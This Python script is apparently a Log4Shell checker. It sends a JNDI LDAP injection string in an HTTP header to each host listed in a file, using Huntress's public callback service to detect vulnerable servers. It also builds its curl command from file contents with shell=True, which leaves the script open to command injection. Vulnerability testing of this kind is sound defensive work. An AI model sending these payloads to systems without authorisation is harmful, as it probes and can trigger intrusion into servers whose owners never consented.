#!/usr/bin/env python
import os
import time
import subprocess

targets_txt = "targets.txt"

def scan():
    targets = []
    with open(targets_txt, 'r', encoding='utf8') as f:
        targets.extend(f.read().splitlines())

    # Checking Targets
    for target in targets:
        try:
            check_url = "${jndi:ldap://log4shell.huntress.com:1389/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx}"
            bashCommand = "curl " + f"{target} " + "-k -H " + f"'X-Api-Version: {check_url}'"
            print("trying: " +  bashCommand)
            subprocess.call(bashCommand, timeout=5, shell=True)
        except:
            pass

    # Result URL
    result_guid = check_url.replace("${jndi:ldap://log4shell.huntress.com:1389/", "").replace("}","")
    result_url = "https://log4shell.huntress.com/view/" + result_guid
    print("\npleasecheck: " + result_url )

if __name__ == '__main__':
    scan()


